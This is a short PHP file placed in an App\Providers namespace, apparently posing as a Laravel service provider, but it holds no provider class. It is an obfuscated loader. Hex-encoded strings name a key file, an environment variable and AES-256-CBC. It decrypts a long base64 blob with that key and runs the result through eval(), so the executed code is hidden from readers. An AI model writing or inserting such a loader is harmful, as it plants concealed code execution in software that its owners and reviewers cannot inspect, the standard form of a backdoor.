<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('mWMANK3mq49/4oWYEShArg==');

$c=base64_decode(

'5WajNeN4dHfO0zD64Iaba3WuttqjMF213iD3M3y8Qy5qcWpH3ns8ss7PhHMXgdFtVDZkm2Iv2Nub' .
'gqmzUcTv8cby2NPOabS2GFrF2g68vHz7OpBd/avUATmYiGc2IXozU/zeyx81gmciK5wI5qt6iM1B' .
'KYIxKgqoFbPF25e/MPnyEoPdEb1Ymn7E7/5hiMhbFe/uGEQudnJv+a+I0c++Oy1S1l8i7yNtAkjT' .
'KeT7m9Id5Lu/D0e9wUGnYwEjtqtV90t38L7z2VwQmvyAfsO1uKLg9mvYxmvKaEhx7ulJWkB4wUuo' .
'jdfAbKD56c+nAjNJ/J1mDAiIftfQiMxZE8R8ymjsiMfm3h/B2uwMmERZbbbFFBW0rmjObmT5y3b7' .
'EDWxm/3YbA8LwqH/l++ZaeArnV9UNoG705KPh6Mxf/XFUat6VH7UsP19EG9LvD4UnxBZdU75HAIo' .
'Y4ua0dnSxQ3T0zMJGISG0sRLOHLFpRhIf4nQ7y5Pa00S2/etkcinay6fE5dk8p9QqZBamybSd40E' .
'06AmXvN/6fQpHeUoi7QZf8CaEUtQPE8NfiQoz1OaEjD5131vc8eS8n3pIJ4nTKhZ7i1u/hMQcyVh' .
'xC1gfdBXor+QR/csL+fR9e+A4uIWD5nIOOF/2eUPuCNUjQg3zUNJH9C3DoAOqXGFvmWT2A1ERgQE' .
'roZxumumBpXyFTlrAn9L6MbMr9mPPE3QSzWcYwLEjJEb2dj+otwZjnt3wI7x6ePQfXjjUa+JB2jI' .
'QYORngl3F0fIOl2NW4d6xlxIqWSyXtggt/2e3MWk6bkyYjHiE8yP8hDulA9y3x9cHFFNG0k/oeLS' .
'9aywaRn+TAcr0JFagJ6dA6TuLFvMstk4bEJ08lHVZjNVOA8Z1DCBMxGMM3tNqJL0x59FseTfTxAW' .
'Uxobc2TCnlUKTYpCda8VVrPxM3qetvPp4SwC5xdc5Jr0yPdl'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

